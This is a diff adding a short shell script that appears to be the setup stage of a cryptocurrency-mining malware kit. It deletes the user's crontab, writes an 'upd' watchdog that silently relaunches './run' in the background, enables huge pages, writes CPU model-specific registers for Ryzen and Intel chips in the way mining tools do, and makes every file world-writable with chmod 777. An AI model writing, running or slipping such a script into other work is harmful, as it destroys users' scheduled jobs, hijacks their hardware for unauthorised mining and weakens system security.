@@ -1,0 +1,44 @@
+#!/bin/sh
+crontab -r
+pwd > dir.dir
+dir=$(cat dir.dir)
+echo "#!/bin/sh
+cd $dir
+if test -r $dir/bash.pid; then
+pid=\$(cat $dir/bash.pid)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+./run &>/dev/null" > upd
+
+sysctl -w vm.nr_hugepages=$(nproc)
+
+for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+do
+    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+done
+
+modprobe msr
+
+if cat /proc/cpuinfo | grep "AMD Ryzen" > /dev/null;
+	then
+		echo "Detected Ryzen"
+		wrmsr -a 0xc0011022 0x510000
+		wrmsr -a 0xc001102b 0x1808cc16
+		wrmsr -a 0xc0011020 0
+		wrmsr -a 0xc0011021 0x40
+		echo "MSR register values for Ryzen applied"
+elif cat /proc/cpuinfo | grep "Intel" > /dev/null;
+	then
+		echo "Detected Intel"
+		wrmsr -a 0x1a4 6
+		echo "MSR register values for Intel applied"
+else
+	echo "No supported CPU detected"
+fi
+
+chmod u+x upd
+chmod 777 *
+./upd
